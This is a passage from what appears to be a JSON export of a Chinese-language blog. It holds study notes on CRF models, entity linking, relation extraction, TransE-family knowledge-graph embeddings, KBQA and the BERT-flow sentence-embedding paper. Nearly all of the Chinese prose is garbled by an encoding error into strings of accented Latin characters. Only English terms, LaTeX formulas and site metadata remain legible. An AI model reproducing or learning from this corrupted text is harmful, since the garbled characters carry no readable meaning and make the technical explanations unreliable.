åªå’Œå½“å‰èŠ‚ç‚¹æœ‰å…³ åªå’Œå½“å‰èŠ‚ç‚¹å’Œä¸Šâ¼€ä¸ªèŠ‚ç‚¹æœ‰å…³ï¼Œå±€éƒ¨ç‰¹å¾å‡½æ•° linear-CRFç”± tk, Î»k, sl, Âµl å…±åŒå†³å®š i -- è¡¨ç¤ºä»0åˆ°Tçš„åºåˆ—ä½ç½®ï¼›k, l -- è¡¨ç¤ºè‡ªå®šä¹‰çš„ç‰¹å¾å‡½æ•°ç¼–å·ã€‚ åœ¨æ·±åº¦å­¦ä¹ ä¸­ä½¿ç”¨æ—¶ï¼Œç”¨æ·±åº¦æ¨¡å‹ä»£æ›¿ç‰¹å¾å‡½æ•°ï¼š CRFç›¸å¯¹äºHMMçš„ä¼˜ç‚¹ è§„é¿äº†é©¬å°”å¯å¤«æ€§ï¼Œèƒ½å¤Ÿè·å–é•¿æ–‡æœ¬çš„è¿œè·ç¦»ä¾èµ–çš„ä¿¡æ¯ è§„é¿äº†é½æ¬¡æ€§ï¼Œå¹¶ä¸”åºåˆ—çš„ ä½ç½®ä¿¡æ¯ä¼šå½±å“é¢„æµ‹å‡ºçš„çŠ¶æ€åºåˆ— è§„é¿ï¦ºè§‚æµ‹ç‹¬ç«‹æ€§ï¼Œè§‚æµ‹å€¼ä¹‹é—´çš„ç›¸å…³æ€§ä¿¡æ¯èƒ½å¤Ÿè¢«æå– ä¸æ˜¯å•å‘å›¾ï¼Œè€Œæ˜¯æ— å‘å›¾ï¼Œèƒ½å¤Ÿå……åˆ†æå–ä¸Šä¸‹æ–‡ä¿¡æ¯ä½œä¸ºç‰¹ å¾ æ”¹å–„ï¦ºæ ‡è®°åç½®Label Biasé—®é¢˜ CRFçš„æ€ï¤·æ˜¯ï§ç”¨å¤šä¸ªç‰¹å¾ï¼Œå¯¹çŠ¶æ€åºåˆ—è¿›ï¨ˆé¢„æµ‹ã€‚HMM çš„è¡¨ç°å½¢å¼ä½¿ä»–æ— æ³•ä½¿â½¤å¤šä¸ªå¤æ‚ç‰¹å¾ CRFçš„ç¼ºç‚¹ CRFè®­ç»ƒä»£ä»·å¤§ã€å¤æ‚åº¦é«˜ éœ€è¦äººä¸ºæ„é€ ç‰¹å¾å‡½æ•°ï¼Œç‰¹å¾å·¥ç¨‹å¯¹CRFæ¨¡å‹çš„å½±å“å¾ˆå¤§ å®ä½“è¿æ¥ å€™é€‰å®ä½“ç”Ÿæˆï¼š æ ¹æ®è¾“å…¥æ–‡æœ¬ä¸­æ£€æµ‹å‡ºçš„å®ä½“mentioné›†åˆMï¼Œä»ç»™å®šçŸ¥è¯†å›¾è°±ä¸­æ‰¾åˆ°å¯èƒ½å±äºMçš„å€™é€‰å®ä½“é›†åˆm å€™é€‰å®ä½“æ’åºï¼š è´Ÿè´£å¯¹å€™é€‰å®ä½“é›†åˆmä¸­å¤šä¸ªå€™é€‰å®ä½“æ‰“åˆ†çš„æ’åºï¼Œ å¹¶è¾“å‡ºå¾—åˆ†æœ€é«˜çš„å€™é€‰å®ä½“ï¼Œä½œä¸ºå®ä½“é“¾æ¥ç»“æœ å…³ç³»åˆ†ç±»ç®€ä»‹ å…³ç³»æŠ½å–: ä»ä¸€ä¸ªå¥å­ä¸­åˆ¤æ–­ä¸¤ä¸ªentityæ˜¯å¦æœ‰å…³ç³»ï¼Œä¸€èˆ¬æ˜¯ä¸€ä¸ªäºŒåˆ†ç±»é—®é¢˜ï¼ŒæŒ‡å®šæŸç§å…³ç³» å…³ç³»åˆ†ç±»: ä¸€èˆ¬æ˜¯åˆ¤æ–­ä¸€ä¸ªå¥å­ä¸­ä¸¤ä¸ªentityæ˜¯å“ªç§å…³ç³»ï¼Œå±äºå¤šåˆ†ç±»é—®é¢˜ã€‚ æ ‡æ³¨å·¥å…·: BRAT BRATæ˜¯ä¸€ä¸ªåŸºäºwebçš„æ–‡æœ¬æ ‡æ³¨å·¥å…·ï¼Œä¸»è¦ç”¨äºå¯¹æ–‡æœ¬çš„ç»“æ„åŒ–æ ‡æ³¨ï¼Œç”¨BRATç”Ÿæˆçš„æ ‡æ³¨ç»“æœèƒ½å¤ŸæŠŠæ— ç»“æ„åŒ–çš„åŸå§‹æ–‡æœ¬ç»“æ„åŒ–ï¼Œä¾›è®¡ç®—æœºå¤„ç†ã€‚åˆ©ç”¨è¯¥å·¥å…·å¯ä»¥æ–¹ä¾¿çš„è·å¾—å„é¡¹NLPä»»åŠ¡éœ€è¦çš„æ ‡ æ³¨è¯­æ–™ã€‚ æ–¹æ³•ï¼š åŸºäºè§„åˆ™çš„æ–¹æ³•â€”â€”äººå·¥æ¨¡æ¿ åŸºäºè§„åˆ™çš„æ–¹æ³•â€”â€”åŸºäºç»Ÿè®¡çš„æ–¹æ³• åŸºäºç›‘ç£å­¦ä¹ çš„æ–¹æ³•â€”â€”CNN/RNN åŸºäºç›‘ç£å­¦ä¹ çš„æ–¹æ³•â€”â€”PCNN åŠç›‘ç£å­¦ä¹ çš„æ–¹æ³•â€”â€”è‡ªä¸¾ åŠç›‘ç£å­¦ä¹ çš„æ–¹æ³•â€”â€”è¿œç¨‹ç›‘ç£ åŸºäºç»Ÿè®¡çš„æ–¹æ³• è¾“å…¥å…³ç³»é›†åˆä¸­çš„ä¸€ä¸ª æœç´¢ä¸€ç»„å®ä½“å¯¹ï¼Œæ»¡è¶³å…³ç³» è¾“å…¥å®ä½“å¯¹ï¼Œæœç´¢åŒ…å«å®ä½“å¯¹çš„å¥å­ï¼Œä¿å­˜ å°†ä¿å­˜å¥å­ä¸­çš„å®ä½“å¯¹ï¼Œä½¿ç”¨åŒä¸€ç±»å…³ç³»æ¨¡ç‰ˆæ›¿æ¢ è®¡ç®—æˆåŠŸæ›¿æ¢ï¼Œæ¨¡ç‰ˆåŒ¹é…æ­£ç¡®çš„æ¯”ä¾‹ï¼Œå³æ¦‚ç‡ï¼Œä½œä¸ºæ¨¡ç‰ˆçš„å¾—åˆ†ï¼ˆç½®ä¿¡åº¦ï¼‰ã€‚ç•™ä¸‹å¾—åˆ†é«˜çš„æ¨¡ç‰ˆ ç¥ç»ç½‘ç»œæ–¹æ³• è¾“å…¥embeddingï¼Œå¯åŠ ä¸Šç›¸å¯¹ä½ç½®embeddingï¼Œè®­ç»ƒåˆ†ç±»å™¨ã€‚ PCNNçš„Piecewise Convolutionalï¼Œåªæ˜¯ä½¿ç”¨Piecewise max poolingï¼Œä»å®ä½“æ‰€åœ¨ä½ç½®å¤„ï¼Œåˆ†æ®µè¿›è¡Œpoolingã€‚ åŠç›‘ç£ Bootstrapping åˆ›å»ºç©ºçš„åˆ—è¡¨ï¼› ä½¿ç”¨ç²¾å¿ƒé€‰æ‹©çš„ç§å­åˆå§‹åŒ–åˆ—è¡¨ï¼› åˆ©ç”¨åˆ—è¡¨ä¸­çš„å†…å®¹ä»è®­ç»ƒè¯­æ–™åº“ä¸­æŸ¥æ‰¾æ›´å¤šå†…å®¹ï¼› ç»™é‚£äº›æ–°å‘ç°çš„å†…å®¹æ‰“åˆ†ï¼›æŠŠå¾—åˆ†æœ€é«˜çš„å†…å®¹åŠ åˆ°åˆ—è¡¨ä¸­ã€‚ é‡å¤æ­¥éª¤3å’Œ4ï¼Œç›´åˆ°è¾¾åˆ°æœ€å¤§è¿­ä»£æ¬¡æ•°æˆ–è€…å…¶å®ƒåœæ­¢æ¡ä»¶ä¸ºæ­¢ã€‚ Snowballä¼˜åŒ–äº†éƒ¨åˆ†çš„ç»†èŠ‚ å®šä¹‰pattern æˆä¸º&lt;left, tag1, middle, tag2, right&gt;; tuples ä¸º &lt;tag1 , tag2&gt; ç”Ÿæˆæ–°patternæ—¶ï¼Œè¯„ä¼°å…¶ä¸å·²æœ‰patternçš„ç›¸ä¼¼æ€§ï¼Œå–ä¸€ä¸ªé˜ˆå€¼ä¹‹ä¸Šçš„ï¼ŒåŠ å…¥patterné›†åˆã€‚ tuplesè¦ç»è¿‡å¯ä¿¡åº¦è®¡ç®—ï¼Œé€‰æ‹©å¯ä¿¡åº¦é«˜çš„ç•™ä¸‹ï¼Œè®¡ç®—æ–¹æ³•çœ‹è®ºæ–‡æˆ–è€…blogå§ã€‚ è¿œç¨‹ç›‘ç£ å°†å·²æœ‰çš„çŸ¥è¯†å¯¹åº”åˆ°ä¸°å¯Œçš„éç»“æ„åŒ–è¯­æ–™ä¸­ä»è€Œç”Ÿæˆå¤§é‡çš„è®­ç»ƒæ•°æ®ã€‚çŸ¥è¯†æ¥æºï¼šäººå·¥æ ‡æ³¨ã€ç°æœ‰çš„çŸ¥è¯†åº“ã€ç‰¹å®šçš„è¯­å¥ç»“æ„ã€‚ Distant supervised ä¼šäº§ç”Ÿæœ‰å¤§é‡å™ªéŸ³æˆ–è€…è¢«é”™è¯¯æ ‡æ³¨çš„æ•°æ®ï¼Œç›´æ¥ä½¿ç”¨supervisedçš„æ–¹æ³•è¿›è¡Œå…³ç³»åˆ† ç±»ï¼Œæ•ˆæœå¾ˆå·®ã€‚ çŸ¥è¯†è¡¨ç¤ºEmbedding TransE TransEï¼Œâ¼€ç§å°†å®ä½“ä¸å…³ç³»åµŒâ¼Šåˆ°ä½ç»´å‘é‡ç©ºé—´ä¸­çš„ç®€å•æ¨¡å‹ ã€‚è¯¥æ¨¡å‹å·²ç»æˆä¸ºäº†çŸ¥è¯† å›¾è°±å‘é‡åŒ–è¡¨ç¤ºçš„ baselineï¼Œå¹¶è¡â½£å‡ºä¸åŒçš„å˜ä½“ã€‚åŸç†ç®€è¿°ï¼š hï¼Œtä¸ºå®ä½“å‘é‡ï¼Œrä¸ºå…³ç³»å‘é‡ã€‚ ä»¥L2 è·ç¦»ä¸ºä¾‹ï¼Œæ¢¯åº¦çš„è®¡ç®—ç›¸å¯¹â½è¾ƒç®€å•ï¼Œâ½¬æ ‡å‡½æ•°å˜ä¸º æ±‚è§£å¯¼æ•°ï¼š å®Œæ•´ç®—æ³•ï¼š è¯„æµ‹æ–¹æ³•ï¼š åœ¨æµ‹è¯•æ—¶ï¼Œä»¥â¼€ä¸ªä¸‰å…ƒç»„ä¸ºä¾‹ï¼Œâ½¤è¯­æ–™ä¸­æ‰€æœ‰å®ä½“æ›¿æ¢å½“å‰ä¸‰å…ƒç»„çš„å¤´å®ä½“è®¡ç®—è·ç¦»d(h â€²+l,t)ï¼Œå°†ç»“æœæŒ‰å‡åºæ’åºï¼Œâ½¤æ­£ç¡®ä¸‰å…ƒç»„ çš„æ’åæƒ…å†µæ¥è¯„ä¼°å­¦ä¹ æ•ˆæœï¼ˆåŒç†å¯¹å°¾å®ä½“è¿™æ ·åšï¼‰ã€‚(è‹¥æ›¿æ¢åˆ°åœ¨è®­ç»ƒé›†ä¸­çš„ä¸‰å…ƒç»„ï¼Œå¯ä»¥é€‰æ‹© åˆ æ‰) åº¦é‡æ ‡å‡†é€‰æ‹©hits@10å’Œmean rankï¼Œå‰è€…ä»£è¡¨ å‘½ä¸­å‰10çš„æ¬¡æ•°/æ€»æŸ¥è¯¢æ¬¡æ•°ï¼Œåè€…ä»£è¡¨ æ­£ç¡®ç»“æœæ’åä¹‹å’Œ/æ€»æŸ¥è¯¢æ¬¡æ•° è®­ç»ƒé€Ÿåº¦å¿«ã€æ˜“äºå®ç°ã€‚å¦å¤–ï¼Œå¯ä»¥å°†word2vecå’ŒTransEä¸€èµ·èåˆè®­ç»ƒï¼Œæ­¤å¤„ä¸ä½œå±•å¼€ã€‚ TransH è™½ç„¶ TransE æ¨¡å‹å…·æœ‰è®­ç»ƒé€Ÿåº¦å¿«ã€æ˜“äºå®ç°ç­‰ä¼˜ç‚¹ï¼Œä½†æ˜¯å®ƒä¸èƒ½å¤Ÿè§£å†³å¤šå¯¹â¼€å’Œâ¼€å¯¹å¤šå…³ç³»çš„é—®é¢˜ã€‚ä»¥ å¤šå¯¹â¼€å…³ç³»ä¸ºä¾‹ï¼Œå›ºå®š r å’Œ tï¼ŒTransE æ¨¡å‹ä¸ºäº†æ»¡â¾œä¸‰â»†é—­åŒ…å…³ç³»ï¼Œè®­ç»ƒå‡ºæ¥çš„å¤´èŠ‚ç‚¹çš„å‘é‡ä¼šå¾ˆç›¸ä¼¼ã€‚â½½TransHæ˜¯â¼€ç§å°†å¤´å°¾èŠ‚ç‚¹æ˜ å°„åˆ°å…³ç³»å¹³â¾¯çš„æ¨¡å‹ï¼Œèƒ½å¤Ÿå¾ˆå¥½åœ°è§£å†³è¿™â¼€é—®é¢˜ã€‚ å¯¹äºå¤šå¯¹â¼€å…³ç³»ï¼ŒTransH ä¸åœ¨ä¸¥æ ¼è¦æ±‚ h+r-l=0ï¼Œâ½½æ˜¯åªéœ€è¦ä¿è¯å¤´ç»“ç‚¹å’Œå°¾èŠ‚ç‚¹åœ¨å…³ç³»å¹³ â¾¯ä¸Šçš„æŠ•å½±åœ¨â¼€æ¡ç›´çº¿ä¸Šå³å¯ã€‚ TransR TransE å’Œ TransH éƒ½å‡è®¾å®ä½“å’Œå…³ç³»åµŒâ¼Šåœ¨ç›¸åŒçš„ç©ºé—´ä¸­ã€‚ç„¶â½½ï¼Œâ¼€ä¸ªå®ä½“æ˜¯å¤šç§å±æ€§çš„ç»¼åˆä½“ï¼Œä¸åŒå…³ ç³»å¯¹åº”å®ä½“çš„ä¸åŒå±æ€§ï¼Œå³å¤´å°¾èŠ‚ç‚¹å’Œå…³ç³»å¯èƒ½ä¸åœ¨â¼€ä¸ªå‘é‡ç©ºé—´ä¸­ã€‚ TransD TransRåŒæ ·æœ‰å®ƒçš„é—®é¢˜ï¼Œé¦–å…ˆå¯¹äºä¸€ç§å…³ç³»ï¼Œå®ƒçš„å¤´å®ä½“å’Œå°¾å®ä½“ä½¿ç”¨åŒæ ·çš„å˜æ¢çŸ©é˜µæ˜ å°„åˆ°å…³ç³»ç©ºé—´ï¼Œè€Œå¤´å®ä½“å’Œå°¾å®ä½“å¾€å¾€æ˜¯å®Œå…¨ä¸åŒç±»çš„å®ä½“ï¼Œä¹Ÿåº”è¯¥ä½¿ç”¨ä¸åŒçš„æ–¹æ³•è¿›è¡Œæ˜ å°„ã€‚ TransDæ¨¡å‹å¯¹æ¯ä¸ªå®ä½“æˆ–å…³ç³»ä½¿ç”¨ä¸¤ä¸ªå‘é‡è¿›è¡Œè¡¨ç¤ºï¼Œä¸€ä¸ªå‘é‡è¡¨ç¤ºè¯­ä¹‰ï¼Œå¦ä¸€ä¸ªï¼ˆç”¨ä¸‹è¡¨pè¡¨ç¤ºï¼‰ç”¨æ¥æ„å»ºæ˜ å°„çŸ©é˜µã€‚ é—®ç­”åº”ç”¨ åŸºäºçŸ¥è¯†å›¾è°±çš„é—®ç­”KBQA åŸºæœ¬æµç¨‹ï¼š â¾ƒç„¶è¯­â¾”æŸ¥è¯¢--&gt;æ„å›¾è¯†åˆ«(Intention Recognition)--&gt;å®ä½“é“¾æŒ‡(Entity Linking)+å…³ç³»è¯†åˆ«(Relation Detection) --&gt; æŸ¥è¯¢è¯­å¥æ‹¼è£…(Query Construction)--&gt;è¿”å›ç»“æœé€‰æ‹©(Answering Selection) æ„å›¾è¯†åˆ«(Intention Recognition)ï¼šé¢„å…ˆå‡†å¤‡å¥½æ„å›¾æ¨¡æ¿ï¼Œå¯ä»¥é€šè¿‡ç›¸ä¼¼åº¦æ¥åŒ¹é…ï¼Œä¹Ÿå¯ä»¥é€šè¿‡æœºå™¨å­¦ä¹ â¾¥çš„ åˆ†ç±»é—®é¢˜æ¥è§£å†³ï¼Œè¿™ä¸ªæ˜¯æ‰€æœ‰é—®ç­”ç³»ç»Ÿéƒ½è¦â¾¯ä¸´çš„é—®é¢˜ã€‚ å®ä½“é“¾æŒ‡(Entity Linking)+å…³ç³»è¯†åˆ«(Relation Detection)ï¼šå°†æŸ¥è¯¢è¯­å¥ä¸­å‡ºç°çš„å®ä½“å’Œå…³ç³»æ˜ å°„åˆ°çŸ¥è¯†å›¾è°±â¾¥ï¼Œæœ¬è´¨æ˜¯â¼€ä¸ªNERé—®é¢˜ï¼Œåªæ˜¯éœ€è¦å°†NERç»“æœè¿›â¼€æ­¥é“¾æ¥åˆ°å›¾è°±ã€‚ æŸ¥è¯¢è¯­å¥æ‹¼è£…(Query Construction)ï¼šéœ€è¦æ ¹æ®åº•å±‚çŸ¥è¯†å›¾è°±çš„æŸ¥è¯¢è¯­â¾”ï¼Œæ‹¼è£…æˆå¯¹åº”çš„queryæ¥æŸ¥è¯¢(sparq ç­‰)ï¼Œæœ€ç®€å•çš„â½…æ³•å°±æ˜¯é¢„å…ˆå®šä¹‰å¥½æŸ¥è¯¢æ¨¡æ¿ï¼Œæ ¹æ®ä¹‹å‰è§£æå‡ºæ¥çš„(æ„å›¾ï¼Œå®ä½“ï¼Œå…³ç³»)å¡«è¿›æ¨¡æ¿æŸ¥è¯¢å³å¯ã€‚ è¿”å›ç»“æœé€‰æ‹©(Answering Selection)ï¼šå›¾è°±æŸ¥è¯¢ä¹‹åçš„ç»“æœå¯èƒ½å­˜åœ¨å¤šä¸ªï¼Œéœ€è¦é€‰æ‹©â¼€ä¸ªæœ€åˆé€‚çš„ç­”æ¡ˆï¼Œå¯ ä»¥é¢„å…ˆæŒ‡å®šæ’åºè§„åˆ™å»é€‰æ‹©ç­”æ¡ˆã€‚ å‚è€ƒï¼š å®ä¾‹ï¼šNL2SQLæ¯”èµ›ç¬¬ä¸‰åæ–¹æ¡ˆï¼Œå¾…å­¦ä¹  åŸºäºçŸ¥è¯†è¡¨ç¤ºçš„é—®ç­”KEQA KEQA KEQAçš„ç›®æ ‡ä¸æ˜¯ç›´æ¥æ¨æ–­å¤´éƒ¨å®ä½“å’Œè°“è¯ï¼Œè€Œæ˜¯è”åˆæ¢å¤çŸ¥è¯†å›¾åµŒå…¥ç©ºé—´ä¸­é—®é¢˜çš„å¤´éƒ¨å®ä½“ã€è°“è¯å’Œå°¾éƒ¨å®ä½“è¡¨ç¤º(eh, p, et)ã€‚åˆ†åˆ«è®­ç»ƒä¸¤ä¸ªæ¨¡å‹ï¼Œä¸€ä¸ªå­¦ä¹  è°“è¯p å’Œ å®ä½“e çš„è¡¨ç¤ºï¼Œä¸€ä¸ªè¯†åˆ«é—®é¢˜ä¸­åˆ°çš„Headå®ä½“ã€‚å¦‚ä¸‹é¢ä¸¤ä¸ªå›¾æ‰€ç¤ºã€‚ Entity Linking: Finding Extracted Entities in a Knowledge Base â†©ï¸ Improved Neural Relation Detection for Knowledge Base Question Answering â†©ï¸","categories":[{"name":"Notes","slug":"Notes","permalink":"https://racleray.github.io/categories/Notes/"},{"name":"NLP","slug":"Notes/NLP","permalink":"https://racleray.github.io/categories/Notes/NLP/"}],"tags":[{"name":"relation extraction","slug":"relation-extraction","permalink":"https://racleray.github.io/tags/relation-extraction/"},{"name":"NER","slug":"NER","permalink":"https://racleray.github.io/tags/NER/"},{"name":"TransE","slug":"TransE","permalink":"https://racleray.github.io/tags/TransE/"},{"name":"Knowledge Graph","slug":"Knowledge-Graph","permalink":"https://racleray.github.io/tags/Knowledge-Graph/"}]},{"title":"BERT-flow and more","slug":"BERT-flow-and-more","date":"2021-02-12T16:10:19.000Z","updated":"2023-08-07T11:54:31.025Z","comments":true,"path":"posts/a954bb00.html","link":"","permalink":"https://racleray.github.io/posts/a954bb00.html","excerpt":"è®°å½•å¯¹BERT-flowæ¨¡å‹è®ºæ–‡çš„ä¸€ç‚¹æ€è€ƒï¼Œä»¥åŠè®°å½•è‹å‰‘æ—æå‡ºçš„æ›´ç®€å•çš„çŸ©é˜µç©ºé—´å˜æ¢æ–¹æ³•è§£å†³å¥å­å‘é‡è¡¨è¾¾èƒ½åŠ›ä¸ç†æƒ³çš„é—®é¢˜ã€‚","text":"è®ºæ–‡: On the Sentence Embeddings from Pre-trained Language Models Author: Bohan Li, Hao Zhou, Junxian He, Mingxuan Wang, Yiming Yang, Lei Li Organization: ByteDance AI Lab; Language Technologies Institute, Carnegie Mellon University Info: ç±»åˆ«: BERTè¯­ä¹‰è¡¨ç¤ºåº”ç”¨ä¼˜åŒ– ç ”ç©¶ç›®æ ‡ï¼šå°†åŸæœ¬BERTè®­ç»ƒæ¨¡å¼ä¸‹ç”Ÿæˆçš„è¯­ä¹‰è¡¨ç¤ºçš„å„å‘å¼‚æ€§ç©ºé—´ï¼Œé€šè¿‡è®¾è®¡çš„æ— ç›‘ç£æ–¹æ³•ï¼Œè½¬åŒ–ä¸ºå„å‘åŒæ€§çš„è¯­ä¹‰è¡¨ç¤ºç©ºé—´ã€‚ ç ”ç©¶æˆæœï¼šç»“åˆFlow based modelï¼Œä½¿ç”¨æ— ç›‘ç£æ–¹å¼æå‡è¯­ä¹‰è¡¨ç¤ºçš„æ•ˆæœã€‚ å­˜åœ¨çš„é—®é¢˜ï¼šæŒ‰æ–‡ç« çš„æ€è·¯ï¼Œå°±æ˜¯å°†BERT sentence embeddingåšä¸€ä¸ªè½¬åŒ–ï¼Œä»éæ­£äº¤ï¼ˆorthogonal spaceï¼‰è½¬åŒ–åˆ°æ­£äº¤çš„ç©ºé—´ï¼Œä»¥æ»¡è¶³cos similarityé€‚ç”¨çš„æ¡ä»¶ï¼Œä»¥æé«˜æ•ˆæœã€‚ä½†æ˜¯ä¸€å®šéœ€è¦Flow based æ–¹æ³•æ¥å®ç°å—ï¼Ÿæœ‰æ²¡æœ‰æ›´å¥½çš„æ–¹æ³•ï¼Ÿ å…³é”®è¯ï¼šBERTï¼›Flow based modelï¼›semantic similarity Brief Summary: é¦–å…ˆè§£é‡Šäº†ç›´æ¥åŸºäºBERTç”Ÿæˆçš„sentence embeddingä¸ºä»€ä¹ˆå…¶è¯­ä¹‰è¡¨è¾¾èƒ½åŠ›è¾ƒå·®ï¼Œç„¶åæå‡ºä¸€ç§åœ¨ä¸å¼•å…¥æ›´å¤šç›‘ç£æ•°æ®æ¡ä»¶ä¸‹ï¼Œæå‡å…¶è¯­ä¹‰è¡¨è¾¾èƒ½åŠ›çš„æ–¹æ³•ï¼Œflow based modelã€‚ Outline: ææ¸…æ¥šBERT-induced sentence embeddingçš„ç©ºé—´æœ‰ä»€ä¹ˆç‰¹æ€§ BERT-flowæ€ä¹ˆè®¾è®¡çš„ [æ¥è‡ªè‹å‰‘æ—çš„è´¨ç–‘] BERT-flowï¼Ÿæ²¡å¿…è¦é‚£ä¹ˆå¤æ‚ï¼ŒBERT-whiteningæ›´ä¼˜é›… Main Thought: é¦–å…ˆæ˜¯flow based modelåœ¨å¹²ä»€ä¹ˆï¼Œè¿™é¦–å…ˆæ˜¯ä¸€ä¸ªç”Ÿæˆç½‘ç»œï¼ˆä»¥ä¸‹å›¾ç‰‡å†…å®¹æ¥è‡ªæå®æ¯…è€å¸ˆè¯¾ç¨‹ï¼‰ï¼š è¿™æ˜¯ä¸€ç§ç›´æ¥åœ¨object functionåŸºç¡€ä¹‹ä¸Šä¼˜åŒ–è®¡ç®—çš„æ–¹æ³•ï¼Œç²—æš´ä½†æ˜¯å®ç°èµ·æ¥å¹¶ä¸ç®€å•ã€‚ç›´æ¥ä»\\(\\pi(z)\\)ï¼Œç”±è®¾è®¡çš„ç½‘ç»œ\\(x=f(z)\\)ï¼Œç›´æ¥é€¼è¿‘dataåˆ†å¸ƒ\\(p(x)\\)ã€‚åŸç†å¦‚ä¸‹ï¼š ç›¸åº”å˜é‡çš„å¾®å°å˜åŒ–ï¼Œå¯¼è‡´çš„é¢ç§¯å˜åŒ–æ˜¯ä¸€è‡´çš„ã€‚æ‰©å±•åˆ°äºŒç»´å˜é‡ï¼Œå…¶å˜åŒ–ç›¸ä¹˜å˜æˆäº†é¢ç§¯çš„\\(\\Delta s\\)ã€‚è€ŒçŸ©é˜µçš„è¡Œåˆ—å¼å°±è¡¨ç¤ºäºŒç»´ç©ºé—´ä¸­å›¾åƒä»£è¡¨çš„é¢ç§¯ï¼Œæ‰€ä»¥æœ‰ä»¥ä¸‹æ¨å¯¼ï¼š å¼ä¸­çŸ©é˜µå°±æ˜¯Jacobian matrixï¼Œè‡ªç„¶å¾—åˆ°ï¼š \\(p(x&#39;)=\\pi(z&#39;)|\\frac{1}{det(J_f)}|\\) é‚£ä¹ˆç”±\\(z\\)çš„åˆ†å¸ƒå°±å¯ä»¥æ±‚å‡º\\(x\\)çš„åˆ†å¸ƒã€‚åªæ˜¯è¿™ä¸ªç½‘ç»œ\\(G\\)çš„è®¾è®¡æœ‰ä¸€ç‚¹éº»çƒ¦ï¼Œéœ€è¦ä¿è¯å‚æ•°çŸ©é˜µéœ€è¦æ˜¯é€†å˜æ¢ä¸å¤æ‚ä¸”Jacobian matrixå®¹æ˜“è®¡ç®—ã€‚å› ä¸ºï¼š \\(p(x&#39;)=\\pi(z&#39;)|det(J_{G^{-1}})|\\) ä»¥åŠ \\(z&#39;=G^{-1}(x&#39;)\\) éƒ½éœ€è¦è½¬åŒ–æˆä¸è¾“å…¥ç›¸å…³çš„å‡½æ•°ï¼ˆç½‘ç»œï¼‰ã€‚ åŒæ—¶flowçš„ç½‘ç»œè®¾è®¡ï¼ŒçœŸçš„æ˜¯æœ‰ç‚¹ä½æ•ˆï¼Œå‚æ•°ç©ºé—´å†…å°†å‚æ•°åˆ†ç»„è¿›è¡Œæ›´æ–°ã€‚ å¦‚å›¾ï¼Œä¸Šä¸‹ä¸¤éƒ¨åˆ†ä¸æ˜¯åŒæ—¶æ›´æ–°ï¼Œè€Œæ˜¯åˆ†æ­¥æ›´æ–°è®¡ç®—ã€‚ Key sentences: ç”¨BERTå°†ä¸€ä¸ªå¥å­ç¼–ç æˆä¸€ä¸ªå›ºå®šé•¿åº¦çš„å‘é‡ï¼Œæ–¹æ³•æ˜¯è®¡ç®—BERTæœ€åå‡ å±‚ä¸­context embeddingsçš„å¹³å‡å€¼ï¼Œæˆ–è€…åœ¨[CLS]æ ‡è®°çš„ä½ç½®æå–ã€‚ä¸€èˆ¬å‰ä¸€ç§æ–¹æ³•æ•ˆæœæ›´å¥½ã€‚ä½†æ˜¯åœ¨è¯­ä¹‰è¡¨ç¤ºæ€§èƒ½ä¸Šè¿˜ä¸åŠaveraged GloVe embeddingsæ–¹æ³•ã€‚ 1. è¯­ä¹‰ç›¸ä¼¼åº¦ä¸BERTé¢„è®­ç»ƒçš„å…³ç³» â€‹ é¦–å…ˆï¼ŒBERTå°†ä¼ ç»Ÿçš„auto regressive LMçš„ç›®æ ‡ï¼Œä¿®æ”¹ä¸ºmasked predictï¼š \\[ log(p(x_{1:T}))=\\sum_{t=1}^{T}logp(x_t|context_t) \\] å˜ä¸ºï¼š \\[ p(x_{masked}|context_{of\\ masked})=\\sum_{t=1}^{T}mask_t \\times p(x_t|context_t) \\] ä¸¤è€…å»ºç«‹modelçš„å…±åŒå½¢å¼å¦‚ä¸‹ï¼š \\[ p(x|context)=\\frac{\\exp(VectorFromNet_{context}^TEmbedding_x)}{\\sum_{x&#39;}\\exp(VectorFromNet_{context}^TEmbedding_{x&#39;})} \\] è¿™ç§è¡¨è¾¾å½¢å¼çš„å…³é”®åœ¨\\(VectorFromNet_{context}^TEmbedding_x\\)ï¼Œä»¥ä¸‹ç®€å•å†™ä½œ\\(h_c^Tw_x\\)ã€‚è¿™ç¯‡è®ºæ–‡è¯æ˜äº†ï¼š \\[ h_c^Tw_x\\approx\\log p^*(x|c) + \\lambda_c=PMI(x,c)+\\log p(x)+\\lambda_c \\] â€‹ PMIæŒ‡point wise mutual informationã€‚è¿™ç§å…±ç°ç‰¹å¾é€šå¸¸å¯ä»¥æ•æ‰åˆ°è¯­ä¹‰ä¿¡æ¯ï¼Œåªæ˜¯åœ¨â€œwordâ€å±‚é¢è€Œè¨€ã€‚ â€‹ åŒæ—¶ï¼Œ\\(h_c\\)éšç€ç½‘è·¯å‚æ•°çš„æ›´æ–°è€Œæ›´æ–°ï¼Œä¸åŒçš„contextåœ¨è®­ç»ƒè¿‡ç¨‹ä¸­ç›¸äº’å½±å“ï¼Œå¯è§†ä¸ºä¸€ç§é«˜é˜¶çš„high-orderå…±ç°è¯­ä¹‰ä¿¡æ¯æ•æ‰ã€‚ 2. é—®é¢˜æ‰€åœ¨ ç”¨BERTå°†ä¸€ä¸ªå¥å­ç¼–ç æˆä¸€ä¸ªå›ºå®šé•¿åº¦çš„å‘é‡ï¼Œæ–¹æ³•æ˜¯è®¡ç®—BERTæœ€åå‡ å±‚ä¸­context embeddingsçš„å¹³å‡å€¼ï¼Œæˆ–è€…åœ¨[CLS]æ ‡è®°çš„ä½ç½®æå–ã€‚ä¸€èˆ¬å‰ä¸€ç§æ–¹æ³•æ•ˆæœæ›´å¥½ã€‚ä½†æ˜¯åœ¨è¯­ä¹‰è¡¨ç¤ºæ€§èƒ½ä¸Šè¿˜ä¸åŠaveraged GloVe embeddingsæ–¹æ³•ã€‚ ä¸ºä»€ä¹ˆæ•ˆæœä¸åŠaveraged GloVe embeddingsï¼Ÿ æ–‡ç«  How Contextual are Contextualized Word Representations? Comparing the Geometry of BERT, ELMo, and GPT-2 Embeddings æ¯”è¾ƒäº†é¢„è®­ç»ƒLMçš„word embeddingï¼Œæœ‰å¦‚ä¸‹ç»“è®ºï¼š Contextualized representations(æ¨¡å‹æ¯ä¸€å±‚è¾“å‡º)åœ¨æ¯ä¸€ä¸ªéè¾“å…¥å±‚éƒ½æ˜¯å„å‘å¼‚æ€§çš„ï¼Œå³éæ ‡å‡†æ­£äº¤ç©ºé—´ï¼› é«˜å±‚çš„å„å‘å¼‚æ€§æ›´æ˜¾è‘—ï¼› é«˜å±‚çš„Contextualized 